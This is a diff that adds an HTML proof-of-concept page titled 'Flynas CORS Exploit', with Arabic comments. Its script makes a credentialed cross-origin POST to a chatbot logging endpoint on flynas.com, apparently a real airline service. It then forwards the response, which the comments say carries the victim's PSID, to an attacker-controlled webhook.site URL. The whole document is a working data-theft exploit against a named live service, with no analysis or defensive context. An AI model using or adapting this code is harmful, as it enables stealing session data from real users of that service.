@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<body>
+<h2>Flynas CORS Exploit</h2>
+
+<script>
+// رابط الهاكر اللي راح يوصله ال PSID
+const attacker = "https://webhook.site/e61df333-3d46-44e7-9b16-604bc800d539";
+
+fetch("https://chatbot.flynas.com/botTriggerLogging", {
+    method: "POST",
+    credentials: "include",
+    headers: {
+        "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+        brandData: { lang: "en" }
+    })
+})
+.then(res => res.text())
+.then(data => {
+
+    // إرسال الرد للهاكر (لابتوبك)
+    fetch(attacker, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ response: data })
+    });
+
+    document.body.innerHTML += "<pre>Done</pre>";
+});
+</script>
+
+</body>
+</html>
